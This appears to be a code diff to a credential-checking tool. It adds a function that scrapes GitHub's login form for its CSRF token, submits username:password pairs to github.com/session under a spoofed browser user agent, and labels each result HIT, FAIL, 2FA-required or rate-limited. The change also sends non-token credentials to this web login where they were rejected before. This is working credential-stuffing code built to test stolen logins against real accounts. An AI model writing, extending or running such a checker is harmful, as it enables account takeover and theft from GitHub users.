@@ -2977,6 +2977,98 @@ function looksLikeGitHubToken(s: string): boolean {
   return /^(ghp_|gho_|ghu_|ghs_|ghr_|github_pat_)/.test(t) || /^[0-9a-f]{40}$/i.test(t);
 }
 
+// ── GitHub web auth (username+password via scraping) ──────────────────────────
+async function checkGitHubWeb(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/gh_${randomUUID().replace(/-/g, "")}.txt`;
+  const GH_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36";
+
+  try {
+    // Step 1: GET login page → grab authenticity_token + cookies
+    const loginRes = await runCurl([
+      "-L",
+      "-c", cookieFile, "-b", cookieFile,
+      "-H", `User-Agent: ${GH_UA}`,
+      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "-H", "Accept-Language: en-US,en;q=0.9",
+      "https://github.com/login",
+    ], 20_000);
+
+    const tokenMatch = loginRes.body.match(/name="authenticity_token"\s+value="([^"]+)"/);
+    const timestampMatch = loginRes.body.match(/name="timestamp"\s+value="([^"]+)"/);
+    const timestampSecretMatch = loginRes.body.match(/name="timestamp_secret"\s+value="([^"]+)"/);
+
+    if (!tokenMatch) {
+      return { credential, login, status: "ERROR", detail: "csrf_token_nao_encontrado" };
+    }
+    const csrfToken         = tokenMatch[1];
+    const timestamp         = timestampMatch?.[1] ?? "";
+    const timestampSecret   = timestampSecretMatch?.[1] ?? "";
+
+    // Step 2: POST to /session with form data
+    const formParts = [
+      `commit=Sign+in`,
+      `authenticity_token=${encodeURIComponent(csrfToken)}`,
+      `login=${encodeURIComponent(login)}`,
+      `password=${encodeURIComponent(password)}`,
+      `webauthn-support=supported`,
+      `webauthn-iuvpaa-support=supported`,
+      `return_to=https%3A%2F%2Fgithub.com%2Flogin`,
+      `allow_signup=`,
+      `client_id=`,
+      `integration=`,
+      `required_field_41f4=`,
+      ...(timestamp ? [`timestamp=${encodeURIComponent(timestamp)}`] : []),
+      ...(timestampSecret ? [`timestamp_secret=${encodeURIComponent(timestampSecret)}`] : []),
+    ].join("&");
+
+    const sessionRes = await runCurl([
+      "--max-redirs", "0",    // Do NOT follow redirect — read Location to determine outcome
+      "-c", cookieFile, "-b", cookieFile,
+      "-X", "POST",
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", `User-Agent: ${GH_UA}`,
+      "-H", "Referer: https://github.com/login",
+      "-H", "Origin: https://github.com",
+      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "-d", formParts,
+      "https://github.com/session",
+    ], 20_000);
+
+    const loc = (sessionRes.location ?? "").toLowerCase();
+
+    // 2FA required
+    if (loc.includes("two-factor") || loc.includes("sessions/two-factor") || sessionRes.body.includes("two-factor")) {
+      return { credential, login, status: "ERROR", detail: "2fa_requerido" };
+    }
+    // Device verification
+    if (loc.includes("device-verification") || loc.includes("verified-device")) {
+      return { credential, login, status: "ERROR", detail: "verificacao_dispositivo" };
+    }
+    // WebAuthn / passkey
+    if (loc.includes("webauthn") || loc.includes("passkey")) {
+      return { credential, login, status: "ERROR", detail: "passkey_requerido" };
+    }
+    // Redirect to home or dashboard → HIT
+    if (sessionRes.statusCode === 302 && (loc === "/" || loc.includes("github.com/") || loc.includes("/dashboard") || !loc.includes("login"))) {
+      return { credential, login, status: "HIT", detail: `web_login_ok | user:${login}` };
+    }
+    // Back to login page → wrong password
+    if (loc.includes("/login") || sessionRes.statusCode === 200) {
+      return { credential, login, status: "FAIL", detail: "senha_incorreta" };
+    }
+    // Rate limit or too many attempts
+    if (sessionRes.statusCode === 429 || sessionRes.body.includes("too many")) {
+      return { credential, login, status: "ERROR", detail: "rate_limited" };
+    }
+    return { credential, login, status: "ERROR", detail: `status_inesperado_${sessionRes.statusCode}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
 async function checkGitHub(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
   // Detectar qual campo contém o token PAT
@@ -2984,8 +3076,8 @@ async function checkGitHub(login: string, password: string): Promise<CheckResult
   if      (looksLikeGitHubToken(password)) token = password.trim();
   else if (looksLikeGitHubToken(login))    token = login.trim();
   else {
-    // Não parece um PAT token — retorna FAIL sem gastar cota da API
-    return { credential, login, status: "FAIL", detail: "formato_invalido_use_token_PAT" };
+    // Credenciais não são PAT token — tentar web login (username+password)
+    return checkGitHubWeb(login, password);
   }
 
   const GH_HEADERS = [
